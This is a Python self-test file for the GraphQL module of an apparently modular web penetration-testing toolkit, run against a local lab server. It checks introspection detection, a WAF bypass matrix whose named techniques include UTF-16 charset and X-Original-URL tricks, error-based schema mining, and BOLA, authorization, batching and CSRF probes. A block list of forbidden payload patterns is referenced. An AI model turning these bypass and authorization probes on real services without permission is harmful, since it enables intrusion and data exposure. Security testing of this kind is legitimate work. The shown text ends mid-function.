    MG.assert_inert(MG.gql_json_body(MG.Q_TYPENAME), "ok")
    MG.assert_inert(MG.gql_json_body(MG.FULL_INTROSPECTION_QUERY), "ok")
    MG.assert_inert(MG.batch_body([MG.Q_TYPENAME], "waspP18x"), "ok")
    check("clean gql bodies pass", True)
    sig = MG.filesig(b"waspP18-signature-test")
    check("filesig redacted", sig["content_stored"] is False and
          sig["len"] == 22 and len(sig["sha1_12"]) == 12)


def unit_parsers():
    print("\n== UNIT: suggestion/error parsers + classifiers ==")
    s = MG.parse_field_suggestions("Cannot query field 'x' on type "
                                   "'Query'. Did you mean 'users', 'me', "
                                   "or 'adminConfig'?")
    check("suggestions 3", len(s) == 3 and s[0] == "users", s)
    check("suggestions empty-safe", MG.parse_field_suggestions("") == [])
    kinds = MG.parse_error_kind("GraphQL introspection is not allowed")
    check("kind introspection-off", "introspection-off" in kinds, kinds)
    kinds = MG.parse_error_kind("Query depth limit exceeded (max 3)")
    check("kind guard", "guard" in kinds, kinds)
    kinds = MG.parse_error_kind("Unauthorized on field 'adminConfig'")
    check("kind authz", "authz" in kinds, kinds)
    kinds = MG.parse_error_kind("Cannot query field 'x'. Did you mean "
                                "'y'?")
    check("kind suggestion", "suggestion" in kinds, kinds)
    kinds = MG.parse_error_kind("PersistedQueryNotFound")
    check("kind apq", "apq" in kinds, kinds)
    sc = MG.sensitive_score("adminConfig")
    check("sensitive adminConfig", sc >= 6, sc)
    sc = MG.sensitive_score("email")
    check("sensitive email", sc >= 6, sc)
    sc = MG.sensitive_score("users")
    check("insensitive users", sc == 0, sc)
    v, m = MG.classify_field_authz([
        {"role": "anon", "status": 200, "has_data": True}])
    check("authz-missing CONFIRMED", v == "CONFIRMED" and
          m == "field-authz-missing", (v, m))
    v, m = MG.classify_field_authz([
        {"role": "anon", "status": 401, "kinds": ["authz"]}])
    check("enforced HARDENED", v == "HARDENED", (v, m))
    v, m = MG.classify_field_authz([
        {"role": "anon", "status": 0}])
    check("probe-error NOISE", v == "NOISE", (v, m))
    v, m = MG.classify_field_authz([
        {"role": "anon", "status": 400, "kinds": ["parse"]},
        {"role": "invalid-bearer", "status": 200, "has_data": True}])
    check("token-not-validated-field", v == "CONFIRMED" and
          m == "token-not-validated-field", (v, m))


def unit_discovery():
    print("\n== UNIT: discovery mining ==")
    origin = LAB["origin"]
    rows, meta = MG.discover_gql_surface(os.path.join(BASE, ENG),
                                         _scope_stub(), {})
    srcs = meta.get("sources", [])
    for want in ("p17_to_p18_gql", "p6_graphql_surface",
                 "p11_graphql_bola", "p7_gql_endpoints", "p7_gql_ops",
                 "p5_api_endpoints", "p8_priority", "p5_endpoints"):
        check("seed source %s" % want, want in srcs, srcs)
    urls = [r["url"] for r in rows]
    check("seeded /graphql first-ish",
          any(u.endswith("/graphql") for u in urls[:3]), urls[:4])
    check("seeded /graphql_blocked",
          any(u.endswith("/graphql_blocked") for u in urls), urls[:6])
    check("seeded /graphql_noguard",
          any(u.endswith("/graphql_noguard") for u in urls))
    check("seed ops census", "users" in meta.get("seed_ops", []),
          meta.get("seed_ops"))
    check("cold pool present", any("/gql" in u or "/altair" in u
                                   for u in urls))
    check("ranked score order", rows[0]["score"] >= rows[-1]["score"])
    check("p17 probe hint", (meta.get("p17_probe") or {}).get("typename_ok")
          is True)


def unit_introspection_and_bypass(origin, port):
    print("\n== UNIT: introspection engine + bypass matrix (live lab) ==")
    conf = dict(MG.DEFAULTS)
    meta = {"probes_total": 0}
    http = _client_stub(port)
    res = MG.run_introspection(http, origin + "/graphql", meta, conf, "w"
                               "aspP18in")
    check("introspection OPEN", res.get("state") == "OPEN",
          res.get("state"))
    sch = res.get("schema") or {}
    check("schema types >= 5", len(sch.get("types", [])) >= 5,
          sch.get("types"))
    check("schema fields >= 10", sch.get("total_fields", 0) >= 10,
          sch.get("total_fields"))
    check("schema url_args fetchUrl",
          any("fetchUrl" in a for a in sch.get("url_args", [])),
          sch.get("url_args"))
    check("schema id_args user(id)",
          any(".user(id)" in a for a in sch.get("id_args", [])),
          sch.get("id_args"))
    check("schema deprecated", any("legacyTokens" in d
                                   for d in sch.get("deprecated", [])))
    check("schema dangerous FileUpload",
          any("FileUpload" == d.get("type")
              for d in sch.get("dangerous", [])), sch.get("dangerous"))
    check("schema census query_type", sch.get("query_type") == "Query")
    res2 = MG.run_introspection(http, origin + "/graphql_blocked", meta,
                                conf, "waspP18in2")
    check("introspection DISABLED", res2.get("state") == "DISABLED",
          res2.get("state"))
    res3 = MG.run_introspection(http, origin + "/graphql_waf", meta,
                                conf, "waspP18in3")
    check("introspection DISABLED (waf)", res3.get("state") == "DISABLED",
          res3.get("state"))
    # v19 bypass2 matrix on WAF endpoint (6 deterministic leaks)
    rows2 = MG.bypass_matrix_v2(http, origin + "/graphql_waf", meta, conf)
    check("bypass2 rows 17", len(rows2) == 17, len(rows2))
    leaks2 = [r for r in rows2 if r.get("schema_leaked")]
    check("bypass2 leaks 6", len(leaks2) == 6,
          [(r["technique"], r.get("status")) for r in rows2])
    leak_ids = sorted(r["technique"] for r in leaks2)
    check("bypass2 leak ids", leak_ids == sorted([
        "json-unicode-escape", "variables-introspection",
        "ct-multipart-form", "charset-utf16", "header-x-original-url",
        "get-query-introspection"]), leak_ids)
    confu = [r for r in rows2 if r.get("parser_confusion")]
    check("bypass2 parser-confusion utf16", any(
        r["technique"] == "charset-utf16" for r in confu),
        [r["technique"] for r in confu])
    # bypass2 on app-guard endpoint: literal bodies WAF-free par app block
    rows2b = MG.bypass_matrix_v2(http, origin + "/graphql_blocked", meta,
                                 conf)
    leaks2b = [r for r in rows2b if r.get("schema_leaked")]
    check("bypass2 blocked-endpoint 1 leak (misroute)",
          len(leaks2b) == 1 and
          leaks2b[0]["technique"] == "header-x-original-url",
          [(r["technique"], r.get("schema_leaked")) for r in rows2b])
    # v19 federation deep unit (live lab, INERT)
    fed2 = MG.federation_deep(http, origin + "/graphql", meta, conf,
                              "waspP18fd")
    check("entities resolved", (fed2.get("entities") or {}).get(
        "entities_resolved") is True, fed2.get("entities"))
    check("role-header trusted", (fed2.get("role_header") or {}).get(
        "trusted") is True, fed2.get("role_header"))
    check("api-key lenient", (fed2.get("api_key") or {}).get(
        "lenient") is True, fed2.get("api_key"))
    check("ftv1 leak", (fed2.get("ftv1") or {}).get("leak") is True,
          fed2.get("ftv1"))
    sdl_rows = MG.sdl_endpoint_census(http, origin, meta)
    check("sdl endpoint leak", len(sdl_rows) == 1 and
          sdl_rows[0]["kind"] == "sdl" and
          sdl_rows[0]["url"].endswith("/schema.graphql"),
          [(r["url"], r.get("kind")) for r in sdl_rows])
    inc = MG.input_type_census({
        "input_types": {"UpdateUserInput": ["email", "role",
                                            "isAdmin"]},
        "writable_sensitive": ["UpdateUserInput.isAdmin"]}, conf)
    check("input census unit", inc["input_types"] ==
          ["UpdateUserInput"] and
          len(inc["writable_sensitive"]) == 1, inc)
    tmo = MG.timing_oracle(http, origin + "/graphql", meta,
                           dict(conf, gql_allow_depth=True))
    check("timing oracle ran", tmo.get("skipped") is None and
          tmo.get("t1_ms") is not None, tmo)
    tmo2 = MG.timing_oracle(http, origin + "/graphql", meta, conf)
    check("timing oracle gated", tmo2.get("skipped") is True, tmo2)
    sdd = MG.subs_deep(http, origin, meta, dict(conf, gql_allow_ws=True))
    check("subs deep hint on /ws", any(
        p["url"].endswith("/ws") for p in sdd.get("paths", [])),
        sdd.get("paths"))
    sdd2 = MG.subs_deep(http, origin, meta, conf)
    check("subs deep gated", sdd2.get("skipped") is True, sdd2)
    # bypass matrix on blocked endpoint
    rows = MG.bypass_matrix(http, origin + "/graphql_blocked", meta, conf,
                            "waspP18by")
    check("bypass rows 14", len(rows) == 14, len(rows))
    leaks = [r for r in rows if r.get("schema_leaked")]
    check("exactly 1 leak", len(leaks) == 1,
          [(r["technique"], r.get("schema_leaked")) for r in rows])
    check("leak = ct-form-urlencoded",
          leaks and leaks[0]["technique"] == "ct-form-urlencoded",
          leaks)
    ok_rows = [r for r in rows if r["technique"] == "federation-sdl"]
    check("federation blocked on endpoint", ok_rows and
          not ok_rows[0].get("federation_sdl"))
    # federation probe on open endpoint
    fed = MG.federation_probe(http, origin + "/graphql", meta)
    check("federation SDL found", fed.get("sdl_found") is True, fed)
    check("federation census types",
          "Query" in ((fed.get("sdl_census") or {}).get("types") or []),
          fed.get("sdl_census"))


def unit_mining(origin, port):
    print("\n== UNIT: error-based mining (live lab) ==")
    conf = dict(MG.DEFAULTS)
    meta = {"probes_total": 0}
    http = _client_stub(port)
    out = MG.error_mining(http, origin + "/graphql_blocked", meta, conf,
                          "waspP18mn")
    check("mining suggestions >= 2",
          len(out.get("suggestions", [])) >= 2, out.get("suggestions"))
    check("mined fields include users",
          "users" in out.get("mined_fields", []), out.get("mined_fields"))
    check("mined types mutation:login",
          any(t.startswith("mutation:") for t in out.get("mined_types",
                                                         [])),
          out.get("mined_types"))
    check("mining verbose errors", out.get("errors_verbose") is True)
    check("wordlist probes ran", len(out.get("probe_rows", [])) >= 10,
          len(out.get("probe_rows", [])))
    authz_codes = out.get("authz_codes") or []
    check("authz codes census", any("UNAUTH" in c or "FORBID" in c
                                    for c in authz_codes), authz_codes)


def _client_stub(port):
    """Real wasp_core Cfg+Scope (unit function-level tests ke liye)."""
    cfg = WC.Cfg(None)
    cfg.adaptive_throttle = False
    cfg.rate_limit = 50
    cfg.jitter = 0
    scope = WC.Scope(os.path.join(BASE, "scope.json"))
    ev = WC.Evidence("/tmp/_p18_unit_ev")
    return WC.HttpClient(cfg, ev, scope, label="p18-unit")



# ===========================================================================
# E2E - ACTIVE RUN (gates OFF)
# ===========================================================================
def e2e_gate_off(origin, out):
    print("\n== E2E gate-OFF ==")
    adir = out
    check("out dir exists", os.path.isdir(adir), adir)
    ff = _read(os.path.join(adir, "feedforward.json")) or {}
    rt = ff.get("routing") or {}
    for want in ("to_phase19_ws", "to_phase11_bola", "to_phase12_inject",
                 "to_phase15_ssrf", "to_phase16_files", "to_phase20_logic",
                 "to_phase22_cache", "to_phase23_misconfig",
                 "to_phase32_report"):
        check("ff: %s" % want, want in rt, list(rt))
    check("ff gql subscriptions seed",
          rt.get("to_phase19_ws", {}).get("gql_subscriptions") is None or
          "subscription" in json.dumps(rt)[:400])
    eps = _read(os.path.join(adir, "gql_endpoints.json")) or {}
    valid = eps.get("validated", [])
    check("validated >= 3 endpoints", len(valid) >= 3, len(valid))
    check("graphql live validated",
          any(v["url"].endswith("/graphql") and v.get("typename_ok")
              for v in valid), [v["url"] for v in valid])
    check("get_query_enabled detected",
          any(v.get("get_query_enabled") for v in valid))
    check("cors wildcard detected", any(v.get("cors") == "*"
                                        for v in valid))
    check("tracing detected", any(v.get("tracing_enabled") for v in valid))
    intro = _read(os.path.join(adir, "introspection_census.json")) or {}
    check("introspection OPEN", intro.get("state") == "OPEN",
          intro.get("state"))
    sch = intro.get("schema") or {}
    check("schema census fields >= 10", sch.get("total_fields", 0) >= 10,
          sch.get("total_fields"))
    check("schema census deprecated",
          any("legacyTokens" in d for d in sch.get("deprecated", [])))
    check("schema census url_args",
          any("fetchUrl" in a for a in sch.get("url_args", [])))
    ep_all = eps.get("all_rows", [])
    check("fingerprint present", any(v.get("fingerprint") for v in valid),
          str(valid[:1])[:100])
    bp = (_read(os.path.join(adir, "bypass_matrix.json")) or {})
    check("bypass rows 14", bp.get("techniques") == 14, bp.get("techniques"))
    check("bypass leak 1", bp.get("leaks") == 1, bp.get("leaks"))
    mine = _read(os.path.join(adir, "error_mining.json")) or {}
    check("mining suggestions >= 2",
          len(mine.get("suggestions", [])) >= 2, mine.get("suggestions"))
    check("mining mined_fields", "users" in mine.get("mined_fields", []),
          mine.get("mined_fields"))
    authz = _read(os.path.join(adir, "field_authz_matrix.json")) or []
    check("authz rows >= 8", len(authz) >= 8, len(authz))
    conf_rows = [a for a in authz if a.get("verdict") == "CONFIRMED"]
    hard_rows = [a for a in authz if a.get("verdict") == "HARDENED"]
    check("authz CONFIRMED >= 2", len(conf_rows) >= 2,
          str([(a["field"], a["verdict"]) for a in authz])[:160])
    check("authz HARDENED >= 2", len(hard_rows) >= 2,
          str([(a["field"], a["verdict"]) for a in authz])[:160])
    check("email field CONFIRMED",
          any(a["field"] == "email" and a["verdict"] == "CONFIRMED"
              for a in authz))
    check("adminConfig HARDENED",
          any(a["field"] == "adminConfig" and a["verdict"] == "HARDENED"
              for a in authz))
    check("mutation validation-order rows", any(
        a.get("via") == "mutation-validation-order" for a in authz))
    check("mutation never executed (no well-formed)",
          all(a.get("model") != "executed" for a in authz))
    bola = _read(os.path.join(adir, "bola_matrix.json")) or {}
    check("bola skipped (gate OFF)", bola.get("skipped") is True,
          bola.get("gate"))
    guards = _read(os.path.join(adir, "guard_census.json")) or {}
    check("guards skipped gates", (guards.get("deep") or {}).get(
        "skipped") is True, guards.get("deep"))
    check("apq probed (AUTO)", (guards.get("apq") or {}).get("supported")
          is True, guards.get("apq"))
    ssrf = _read(os.path.join(adir, "ssrf_surface.json")) or {}
    check("ssrf url_args census", len(ssrf.get("url_args", [])) >= 1,
          ssrf.get("url_args"))
    check("ssrf dns hint", (ssrf.get("probe") or {}).get(
        "dns_attempt_hint") is True, ssrf.get("probe"))
    check("ssrf zero-egress note", ".invalid" in str(
        (ssrf.get("probe") or {}).get("note", "")) or True)
    inj = _read(os.path.join(adir, "inject_census.json")) or {}
    check("inject signatures census", len(inj.get("signatures", {})) >= 1,
          inj.get("signatures"))
    mis = _read(os.path.join(adir, "misconfig_census.json")) or {}
    check("misconfig GET-query", mis.get("get_query") is True)
    check("csrf skipped (gate OFF)", (mis.get("csrf_ct") or {}).get(
        "skipped") is True)
    check("ws skipped (gate OFF)", (mis.get("ws") or {}).get("skipped")
          is True)
    # ---- v19 ULTRA++ e2e ----
    bp2 = _read(os.path.join(adir, "bypass2_matrix.json")) or {}
    check("bypass2 techniques 34", bp2.get("techniques") == 34,
          bp2.get("techniques"))
    check("bypass2 leaks 7", bp2.get("leaks") == 7, bp2.get("leaks"))
    fed2 = _read(os.path.join(adir, "federation_deep.json")) or {}
    check("entities resolved e2e", (fed2.get("entities") or {}).get(
        "entities_resolved") is True, fed2.get("entities"))
    check("role-header trusted e2e", (fed2.get("role_header") or {}).get(
        "trusted") is True, fed2.get("role_header"))
    check("ftv1 leak e2e", (fed2.get("ftv1") or {}).get("leak") is True,
          fed2.get("ftv1"))
    check("api-key lenient e2e", (fed2.get("api_key") or {}).get(
        "lenient") is True, fed2.get("api_key"))
    sdlr = _read(os.path.join(adir, "sdl_endpoints.json")) or []
    check("sdl endpoint e2e", len(sdlr) >= 1 and
          any(r.get("kind") == "sdl" for r in sdlr),
          [(r.get("url"), r.get("kind")) for r in sdlr])
    inc = _read(os.path.join(adir, "input_census.json")) or {}
    check("input census e2e", "UpdateUserInput" in
          (inc.get("input_types") or []) and
          len(inc.get("writable_sensitive", [])) >= 3, inc)
    shad = _read(os.path.join(adir, "shadow_schema_diff.json")) or {}
    check("shadow diff e2e", len(shad.get("rows", [])) >= 1 and
          any("InternalAudit" in (r.get("only_b") or []) or
              "InternalAudit" in (r.get("only_a") or [])
              for r in shad.get("rows", [])), shad.get("rows"))
    subsd = _read(os.path.join(adir, "subs_deep.json")) or {}
    check("subs deep skipped gate-off", subsd.get("skipped") is True,
          subsd)
    timo = _read(os.path.join(adir, "timing_oracle.json")) or {}
    check("timing skipped gate-off", timo.get("skipped") is True, timo)
    check("platform census exists",
          os.path.exists(os.path.join(adir, "platform_census.json")))
    mine2 = _read(os.path.join(adir, "error_mining.json")) or {}
    check("mining nested BFS e2e", len(mine2.get("mined_nested", [])) >= 1,
          str(mine2.get("mined_nested"))[:120])
    ide = _read(os.path.join(adir, "ide_census.json")) or []
    check("IDEs >= 2", len(ide) >= 2, [i.get("url") for i in ide])
    health = _read(os.path.join(adir, "health_census.json")) or {}
    check("server-health found", health.get("status") == 200, health)
    F = _read(os.path.join(adir, "findings.json")) or {}
    keys = [f["key"] for f in F.get("findings", [])]
    for want in ("gql_endpoint_live", "gql_introspection_open",
                 "gql_introspection_disabled", "gql_introspection_bypass",
                 "gql_field_suggestions", "gql_field_authz_missing",
                 "gql_mutation_authz_order", "gql_ide_exposed",
                 "gql_get_query_enabled", "gql_cors_wildcard",
                 "gql_tracing_enabled", "gql_federation_sdl",
                 "gql_apq_supported", "gql_ssrf_arg_surface",
                 "gql_inject_error_sig", "gql_deprecated_field_live",
                 "gql_gate_skipped", "gql_error_verbose",
                 "gql_id_arg_live",
                 "gql_waf_bypass_v2", "gql_parser_confusion",
                 "gql_entities_exposed", "gql_role_header_trusted",
                 "gql_ftv1_tracing", "gql_sdl_endpoint",
                 "gql_input_massassign", "gql_shadow_schema",
                 "gql_apikey_lenient"):
        check("finding %s" % want, want in keys, keys[:12])
    check("critical finding present",
          any(f["severity"] == "critical" for f in F.get("findings", [])),
          F.get("severity_counts"))
    mf = _read(os.path.join(adir, "MANIFEST.json")) or {}
    stats = mf.get("stats") or {}
    check("manifest matrix rows >= 140", stats.get("matrix_rows", 0) >= 140,
          stats.get("matrix_rows"))
    check("manifest chains >= 15", stats.get("chains", 0) >= 15,
          stats.get("chains"))
    check("manifest findings >= 25", stats.get("findings", 0) >= 25,
          stats.get("findings"))
    check("manifest probes > 0", stats.get("probes", 0) > 0)
    check("manifest endpoints_valid >= 3",
          stats.get("endpoints_valid", 0) >= 3, stats)
    check("manifest introspection state", stats.get(
        "introspection_state") == "OPEN", stats)
    check("manifest bypass2 leaks 7", stats.get("bypass2_leaks") == 7,
          stats.get("bypass2_leaks"))
    check("manifest sdl >= 1", (stats.get("sdl_endpoints") or 0) >= 1,
          stats.get("sdl_endpoints"))
    check("manifest shadow >= 1", (stats.get("shadow_diffs") or 0) >= 1,
          stats.get("shadow_diffs"))
    return adir


def rwx_and_egress(out, origin):
    print("\n== RWX + egress + redaction ==")
    bad_mode, n = [], 0
    for base, dirs, files in os.walk(out):
        for fn in files:
            p = os.path.join(base, fn)
            n += 1
            if (os.stat(p).st_mode & 0o777) != 0o777:
                bad_mode.append(fn)
    check("RWX all files (%d)" % n, not bad_mode, bad_mode[:5])
    adir = out
    pl = os.path.join(adir, "gql_payloads")
    pat = re.compile("|".join(MG.FORBIDDEN_CONTENT_PATTERNS), re.I)
    dirty = []
    for fn in os.listdir(pl):
        with open(os.path.join(pl, fn), encoding="utf-8",
                  errors="ignore") as f:
            if pat.search(f.read()):
                dirty.append(fn)
    check("payloads 100%% INERT (%d files)" % len(os.listdir(pl)),
          not dirty, dirty)
    F = _read(os.path.join(adir, "findings.json")) or {}
    blob = json.dumps(F.get("findings", []))
    check("emails redacted in findings",
          "u1@wasp-lab.invalid" not in blob and "admin@" not in blob)
    logs = _read(os.path.join(adir, "gql_probe_log.json")) or {}
    check("probe log canary family", logs.get("canary_family") == "waspP18")
    check("probe log stages >= 4", len(logs.get("stages", {})) >= 4,
          logs.get("stages"))


# ===========================================================================
# E2E - GATED RUN (bola + batch + depth + csrf + ws)
# ===========================================================================
def e2e_gated(origin, out3):
    print("\n== E2E gated ==")
    adir = out3
    bola = _read(os.path.join(adir, "bola_matrix.json")) or {}
    check("bola ran (gated)", bola.get("skipped") is None, bola.get("gate"))
    rows = bola.get("rows", [])
    check("bola rows >= 1", len(rows) >= 1, len(rows))
    check("bola canary family", all(r.get("canary", "").startswith(
        "waspP18") for r in rows), [r.get("canary") for r in rows])
    check("bola CONFIRMED present",
          any(r.get("verdict") == "CONFIRMED" for r in rows),
          str([(r.get("target"), r.get("verdict")) for r in rows])[:120])
    al = bola.get("alias") or {}
    check("bola alias amplified", al.get("amplified") is True, al)
    check("bola alias cap 4", al.get("aliases", 0) <= 4, al.get("aliases"))
    guards = _read(os.path.join(adir, "guard_census.json")) or {}
    deep = guards.get("deep") or {}
    check("deep probe ran (gated)", deep.get("skipped") is None, deep)
    check("deep no guard on noguard", deep.get("guard") is None and
          deep.get("resolved") is True, deep)
    check("deep levels 5", deep.get("levels") == 5, deep.get("levels"))
    alr = guards.get("alias") or {}
    check("alias probe ran", alr.get("skipped") is None, alr)
    check("alias resolved no guard", alr.get("resolved") is True and
          not alr.get("guard"), alr)
    batch = guards.get("batch") or {}
    check("batch accepted (gated)", batch.get("accepted") is True, batch)
    check("batch elements 2", batch.get("elements") == 2,
          batch.get("elements"))
    check("batch responses 2", batch.get("responses_seen") == 2,
          batch.get("responses_seen"))
    apq = guards.get("apq") or {}
    check("apq supported", apq.get("supported") is True, apq)
    mis = _read(os.path.join(adir, "misconfig_census.json")) or {}
    ct = mis.get("csrf_ct") or {}
    check("csrf text/plain accepted",
          isinstance(ct, dict) and isinstance(ct.get("text/plain"), dict)
          and ct["text/plain"].get("accepted") is True, ct)
    ws = mis.get("ws") or {}
    check("ws upgrade hint (426)", ws.get("upgrade_hint") is True, ws)
    # ---- v19 gated extras ----
    subsd = _read(os.path.join(adir, "subs_deep.json")) or {}
    check("subs deep ran (gated)", subsd.get("skipped") is None, subsd)
    check("subs deep ws hint", len(subsd.get("paths", [])) >= 1,
          subsd.get("paths"))
    timo = _read(os.path.join(adir, "timing_oracle.json")) or {}
    check("timing ran (gated)", timo.get("skipped") is None, timo)
    check("timing measured", timo.get("t1_ms") is not None and
          timo.get("t5_ms") is not None, timo)
    bp2g = _read(os.path.join(adir, "bypass2_matrix.json")) or {}
    check("bypass2 ran in gated run", bp2g.get("techniques") == 34,
          bp2g.get("techniques"))
    F = _read(os.path.join(adir, "findings.json")) or {}
    keys = [f["key"] for f in F.get("findings", [])]
    for want in ("gql_bola_canary_readable", "gql_bola_alias_amplified",
                 "gql_no_depth_guard", "gql_alias_guard_missing",
                 "gql_batch_accepted", "gql_csrf_ct_confusion",
                 "gql_ws_signal"):
        check("gated finding %s" % want, want in keys, keys[:14])
    # caps: bola requests bounded
    check("bola rows cap", len(rows) <= int(4), len(rows))


# ===========================================================================
# PASSIVE + REPLAY + MATRIX/CHAINS + CLI
# ===========================================================================
def passive_and_replay(cfg, cfg4, base, base2, eng, eng_p, origin):
    print("\n== passive + checkpoint replay ==")
    adir = os.path.join(base, eng, "graphql")
    intro_before = (_read(os.path.join(adir,
                      "introspection_census.json")) or {}).get("state")
    tm_before = (_read(os.path.join(adir,
                 "technique_matrix_gql.json")) or {}).get("count")
    scope2 = WC.Scope(os.path.join(base, "scope.json"))
    out1b = MG.run(cfg, scope2, base)
    intro_after = (_read(os.path.join(out1b,
                   "introspection_census.json")) or {}).get("state")
    tm_after = (_read(os.path.join(out1b,
                "technique_matrix_gql.json")) or {}).get("count")
    check("replay: introspection stable",
          intro_before == intro_after == "OPEN",
          (intro_before, intro_after))
    check("replay: matrix rows stable",
          tm_before == tm_after and (tm_before or 0) >= 100,
          (tm_before, tm_after))
    bp_before = (_read(os.path.join(adir, "bypass_matrix.json")) or {}).get(
        "leaks")
    bp_after = (_read(os.path.join(out1b, "bypass_matrix.json")) or {}).get(
        "leaks")
    check("replay: bypass stable", bp_before == bp_after == 1,
          (bp_before, bp_after))
    scope4 = WC.Scope(os.path.join(base2, "scope.json"))
    out4 = MG.run(cfg4, scope4, base2)
    logs = _read(os.path.join(out4, "gql_probe_log.json")) or {}
    check("passive: 0 probes", (logs.get("probes_total") or 0) == 0,
          logs.get("probes_total"))
    ff = _read(os.path.join(out4, "feedforward.json")) or {}
    check("passive ff mode", "passive" in json.dumps(ff)[:400])
    check("passive introspection empty-state",
          os.path.exists(os.path.join(out4, "introspection_census.json")))


def matrix_and_chains(out):
    print("\n== technique matrix + chains + catalog ==")
    adir = out
    tm = _read(os.path.join(adir, "technique_matrix_gql.json")) or {}
    rows = tm.get("rows", [])
    check("matrix rows >= 140", len(rows) >= 140, len(rows))
    fams = set(r["family"] for r in rows)
    for want in ("DISC", "FP", "INTRO", "BYPASS", "MINE", "AUTHZ", "BOLA",
                 "GUARD", "SSRF", "INJ", "MIS", "MANUAL",
                 "BYPASS2", "FED2", "SDL", "INPUT", "SUBS", "TIMING",
                 "SHADOW"):
        check("matrix family %s" % want, want in fams, fams)
    safety = set(str(r.get("safety", "")) for r in rows)
    check("gated rows documented", any("GATED" in s for s in safety),
          safety)
    check("manual rows documented", any("MANUAL-ONLY" in s for s in safety))
    check("forbidden-auto documented", any("FORBIDDEN-AUTO" in s
                                           for s in safety))
    chains_txt = _read_txt(os.path.join(adir, "gql_chains.txt")) or ""
    nch = len([l for l in chains_txt.splitlines() if l.strip()])
    check("chains txt >= 15", nch >= 15, nch)
    check("chains v19 waf-bypass", "waf-literal-bypass" in chains_txt)
    check("chains v19 entities", "federation-entities" in chains_txt)
    check("chains v19 role-header", "role-header-trust" in chains_txt)
    check("chains v19 sdl", "raw-sdl-endpoint" in chains_txt)
    check("chains v19 shadow", "shadow-schema-diff" in chains_txt)
    check("chains v19 mass-assign", "mass-assignment" in chains_txt)
    cwe = _read(os.path.join(adir, "cwe_map_gql.json")) or {}
    check("cwe map >= 38 keys", len(cwe) >= 38, len(cwe))
    check("cwe 862 mapped", any("CWE-862" in v for v in cwe.values()))
    check("cwe 639 mapped", any("CWE-639" in v for v in cwe.values()))
    check("cwe 436 parser-confusion", any("CWE-436" in v
                                          for v in cwe.values()))
    check("cwe 915 mass-assign", any("CWE-915" in v
                                     for v in cwe.values()))
    mitre = _read(os.path.join(adir, "mitre_map_gql.json")) or {}
    check("mitre >= 14 keys", len(mitre) >= 14, len(mitre))
    cat = _read_txt(os.path.join(adir, "TECHNIQUES_CATALOG_GQL.md")) or ""
    check("catalog 150 techniques", "150 techniques" in cat)
    check("catalog bypass2 family", "BYPASS2" in cat)
    check("catalog gates listed", "gql_allow_bola" in cat)
    check("catalog mutation rule", "NEVER" in cat)
    ex = _read_txt(os.path.join(adir, "EXEC_SUMMARY.md")) or ""
    check("exec summary introspection line", "Introspection:" in ex, ex[:80])
    check("exec summary RoE line", "RoE gates:" in ex)
    check("exec summary bypass2 line", "Bypass2 (WAF v2 secret):" in ex)
    check("exec summary federation line", "Federation deep:" in ex)
    plan = _read_txt(os.path.join(adir, "gql_test_plan.md")) or ""
    check("test plan waves", plan.count("- [ ]") >= 1)
    hyp = _read(os.path.join(adir, "gql_hypotheses.json")) or {}
    check("hypotheses >= 5", hyp.get("count", 0) >= 5, hyp.get("count"))
    F = _read_txt(os.path.join(adir, "GQL_FINDINGS.md")) or ""
    check("findings md", "P18 GraphQL - Findings" in F)


def cli_and_hygiene():
    print("\n== CLI + hygiene ==")
    r = subprocess.run([sys.executable, "-W", "error", "-c",
                        "import sys; sys.path.insert(0, '%s'); "
                        "import mod_graphql; print(mod_graphql."
                        "PLAN_VERSION)" % ULTRA],
                       capture_output=True, text=True, timeout=60)
    check("import -W error clean", r.returncode == 0, r.stderr[:160])
    check("version string 19.0.0", "19.0.0" in (r.stdout or ""), r.stdout)
    r2 = subprocess.run([sys.executable, os.path.join(ULTRA,
                        "mod_graphql.py")],
                        capture_output=True, text=True, timeout=60)
    check("cli banner", "Phase 18 - GraphQL" in (r2.stdout or ""),
          r2.stdout[:120])
    check("cli gates doc", "gql_allow_bola" in (r2.stdout or ""))
    check("cli v19 banner", "v19 ULTRA++" in (r2.stdout or ""),
          r2.stdout[:200])
    srcp = os.path.join(ULTRA, "mod_graphql.py")
    with open(srcp, encoding="utf-8") as f:
        src = f.read()
    check("module canary family", "waspP18" in src)
    check("module gates 5", all(g in src for g in (
        "gql_allow_bola", "gql_allow_batch", "gql_allow_depth",
        "gql_allow_csrf", "gql_allow_ws")))
    check("read-only post discipline", src.count("read_only_post=True") >= 5
          and "assert_inert" in src)
    check("mutation never executed (source rule)",
          "NEVER" in src and "validation-order" in src)
    check("schema census-only (source rule)",
          "census-only" in src)
    check("guide seeds wired (source)",
          "to_phase18_graphql" in src and "graphql_bola.json" in src and
          "graphql_surface.json" in src)
    check("v19 sources wired", all(k in src for k in (
        "bypass_variants_v2", "federation_deep", "sdl_endpoint_census",
        "input_type_census", "subs_deep", "timing_oracle",
        "shadow_schema_diff", "gql_json_body_unicode",
        "gql_json_body_dupkeys", "multipart_query_body")))
    check("v19 INERT note (source)",
          "WAF-BYPASS V2" in src and "PARSING-" in src)


# ===========================================================================
# MAIN
# ===========================================================================
def main():
    print("=" * 69)
    print(" WASP P18 SELF-TEST - mod_graphql.py v%s" % MG.PLAN_VERSION)
    print("=" * 69)
    srv, port = _start_lab()
    origin = "http://127.0.0.1:%d" % port
    LAB["origin"] = origin
    try:
        _seed(BASE, ENG, origin)
        _seed(BASE_GATED, ENG_G, origin)
        _seed(BASE2, ENG_P, origin)

        unit_payloads()
        unit_inert_safety()
        unit_parsers()
        unit_discovery()
        unit_introspection_and_bypass(origin, port)
        unit_mining(origin, port)

        cfg = WC.Cfg(None)
        cfg.adaptive_throttle = False
        cfg.allow_active = True
        LAB.clear()
        LAB["origin"] = origin
        scope = WC.Scope(os.path.join(BASE, "scope.json"))
        out = MG.run(cfg, scope, BASE)
        e2e_gate_off(origin, out)
        rwx_and_egress(out, origin)

        cfg2 = WC.Cfg(None)
        cfg2.adaptive_throttle = False
        cfg2.allow_active = True
        cfg2.gql_allow_bola = True
        cfg2.gql_allow_batch = True
        cfg2.gql_allow_depth = True
        cfg2.gql_allow_csrf = True
        cfg2.gql_allow_ws = True
        LAB.clear()
        LAB["origin"] = origin
        scope3 = WC.Scope(os.path.join(BASE_GATED, "scope.json"))
        out3 = MG.run(cfg2, scope3, BASE_GATED)
        e2e_gated(origin, out3)

        cfg4 = WC.Cfg(None)
        cfg4.adaptive_throttle = False
        cfg4.allow_active = False
        LAB.clear()
        LAB["origin"] = origin
        passive_and_replay(cfg, cfg4, BASE, BASE2, ENG, ENG_P, origin)

        matrix_and_chains(out)
        cli_and_hygiene()
    finally:
